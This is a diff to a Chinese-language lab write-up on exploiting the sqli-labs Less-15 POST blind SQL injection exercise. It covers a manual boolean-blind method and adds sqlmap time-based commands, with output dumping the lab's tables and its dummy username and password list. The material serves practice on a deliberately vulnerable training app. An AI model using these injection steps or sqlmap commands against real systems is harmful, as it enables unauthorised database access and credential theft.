@@ -6,6 +6,7 @@ uname=admin&passwd=admin&submit=Submit
 显示flag.jpg
 即错误时，不返回错误，只返回错误的图片，正确时，返回正确的图片，故采用基于布尔值的盲注
 
+方法一：
 判断sql：
 推测1：select 字段名 from 表名 where uname = "输入" and passwd = "输入"
 uname=admin"-- &passwd=admin&submit=Submit显示slap.jpg，说明推测1不正确
@@ -20,3 +21,39 @@ result: users,uagents,emails,referers
 result: id,username,password,user,current_connections,total_connections
 字段值：
 result: dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+
+方法二：
+采用基于时间盲注（用sqlmap中基于布尔值盲注无法得到结果（原因不明（可能与代码有关
+sqlmap -r /root/桌面/sqlilabs_qiu/POST盲注Less15-16/Less-15/raw.txt --technique T --batch --current-db
+current database: 'security'
+sqlmap -r /root/桌面/sqlilabs_qiu/POST盲注Less15-16/Less-15/raw.txt --technique T --batch -D security --tables
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+sqlmap -r /root/桌面/sqlilabs_qiu/POST盲注Less15-16/Less-15/raw.txt --technique T --batch -D security -T users --columns
+Database: security
+Table: users
+[13 entries]
++----------+------------+
+| username | password   |
++----------+------------+
+| admin    | 123        |
+| admin1   | admin1     |
+| <blank>  | admin2     |
+| admin3   | admin3     |
+| admin4   | admin4     |
+| secure   | crappy     |
+| Dumb     | Dumb       |
+| dhakkan  | dumbo      |
+| superman | genious    |
+| Angelina | I-kill-you |
+| batman   | mob!le     |
+| Dummy    | p@ssword   |
+| stupid   | stupidity  |
++----------+------------+
+
